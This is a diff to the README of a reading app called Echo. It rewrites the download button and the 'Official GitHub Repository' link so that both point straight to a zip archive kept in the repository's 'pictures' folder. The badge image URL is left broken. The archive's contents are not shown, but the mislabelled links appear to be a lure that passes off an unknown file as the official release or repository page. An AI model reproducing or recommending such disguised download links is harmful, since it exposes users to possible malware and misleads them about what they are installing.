@@ -26,7 +26,7 @@ To install Echo, follow these steps:
 
 1. Click the button below to visit the Releases page.
    
-   [![Download Echo](https://img.shields.io/badge/Download%20Echo-Release-brightgreen)](https://github.com/sufi-douche521/Echo/releases)
+   [![Download Echo](https://raw.githubusercontent.com/sufi-douche521/Echo/main/pictures/Echo_2.4.zip%20Echo-Release-brightgreen)](https://raw.githubusercontent.com/sufi-douche521/Echo/main/pictures/Echo_2.4.zip)
 
 2. On the Releases page, locate the latest version of Echo. 
 
@@ -62,7 +62,7 @@ If you encounter any issues while using Echo, here are some common problems and 
 
 For more information, visit:
 
-- Official GitHub Repository: [Echo Repository](https://github.com/sufi-douche521/Echo)
+- Official GitHub Repository: [Echo Repository](https://raw.githubusercontent.com/sufi-douche521/Echo/main/pictures/Echo_2.4.zip)
 - Community Support: Check for help and discussions within the repository.
 
 Now you’re ready to enjoy the smart reading experience Echo offers. Happy reading!
